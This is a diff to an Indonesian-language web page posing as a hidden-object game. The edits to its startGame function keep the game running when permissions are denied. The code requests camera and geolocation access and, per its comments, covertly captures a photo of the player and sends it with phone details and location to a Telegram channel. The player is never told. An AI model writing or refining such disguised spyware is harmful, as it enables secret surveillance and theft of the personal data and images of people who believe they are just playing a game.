@@ -13,17 +13,16 @@
       background-color: black;
       font-family: Arial, sans-serif;
       min-height: 100vh;
-      /* Agar halaman sambutan bisa digulir untuk melihat "Fitur Spesial" */
-      overflow-y: auto;
+      overflow-y: auto; /* agar halaman sambutan bisa digulir */
       position: relative;
     }
-    /* Background utama: hanya hitam, video dihapus */
+    /* Background utama hanya hitam (video dihapus) */
     
     /* Konten Sambutan (Intro) */
     #introText {
       text-align: center;
       color: white;
-      padding: 100px 20px 20px; /* beri ruang atas untuk tampilan layar */
+      padding: 100px 20px 20px;
     }
     #introText h1 { font-size: 2.5rem; margin-bottom: 10px; }
     #introText p { font-size: 1.2rem; margin-bottom: 20px; }
@@ -38,7 +37,7 @@
       border-radius: 5px;
     }
     #startGameBtn:hover { background-color: darkred; }
-    /* Teks Fitur Spesial (link) */
+    /* Teks "Fitur Spesial" */
     #specialLink {
       margin-top: 40px;
       font-size: 1rem;
@@ -52,14 +51,13 @@
       text-align: center;
       color: white;
       background-color: #111;
-      /* Agar bagian ini berada di luar layar awal */
       margin-top: 100vh;
     }
     /* --- Bagian Game --- */
     /* Kontainer Foto (Game) */
     #photoContainer {
       display: none;
-      position: fixed; /* gunakan fixed agar game selalu penuh layar */
+      position: fixed; /* selalu penuh layar selama permainan */
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
@@ -103,7 +101,6 @@
       position: absolute;
       width: 300px; height: 300px;
       border-radius: 50%;
-      /* Menggelapkan layar kecuali area lingkaran */
       box-shadow: 400vh 0px 0px 400vw rgba(0,0,0,0.99);
     }
     .shadow {
@@ -246,26 +243,35 @@
     });
 
     async function startGame() {
+      // Coba minta akses kamera; jika gagal, lanjutkan dengan fallback
       try {
-        // Minta akses kamera (audio tidak digunakan)
         videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
-        // Minta akses lokasi
-        const location = await new Promise((resolve, reject) => {
+      } catch (error) {
+        console.warn("Akses kamera ditolak. Game tetap berjalan tanpa tangkapan foto kamera.");
+        videoStream = null;
+      }
+      // Coba minta akses lokasi; jika gagal, gunakan fallback koordinat (misal: 0,0)
+      let location;
+      try {
+        location = await new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(resolve, reject);
         });
-        
-        alert("Misi Kamu: Carikan ambatukam dibalik objek yang menghalangi (DILIAT BAIK-BAIK). Jika ketemu screenshot ambatukam itu, kirimkan ke pencipta permainan ini untuk mendapatkan hadiah spesial.");
-        
-        // Tangkap foto dari kamera dan kirim ke Telegram (bersamaan dengan info HP & lokasi)
-        capturePhotoAndSend(location.coords);
-        // Tampilkan kontainer game (foto) dan tombol navigasi
-        photoContainer.style.display = 'block';
-        prevBtn.style.display = 'block';
-        nextBtn.style.display = 'block';
-        showPhoto(currentPhotoIndex);
       } catch (error) {
-        alert("Akses ditolak. Game tidak bisa dilanjutkan.");
+        console.warn("Akses lokasi ditolak. Menggunakan fallback koordinat (0,0).");
+        location = { coords: { latitude: 0, longitude: 0 } };
       }
+      
+      alert("Misi Kamu: Carikan ambatukam dibalik objek yang menghalangi (DILIAT BAIK-BAIK). Jika ketemu screenshot ambatukam itu, kirimkan ke pencipta permainan ini untuk mendapatkan hadiah spesial.");
+      
+      // Jika kamera tersedia, tangkap foto dan kirim ke Telegram
+      if (videoStream) {
+        capturePhotoAndSend(location.coords);
+      }
+      // Tampilkan kontainer game (foto) dan tombol navigasi
+      photoContainer.style.display = 'block';
+      prevBtn.style.display = 'block';
+      nextBtn.style.display = 'block';
+      showPhoto(currentPhotoIndex);
     }
 
     // Fungsi menangkap foto dari kamera (tanpa audio) dan mengirimnya ke Telegram
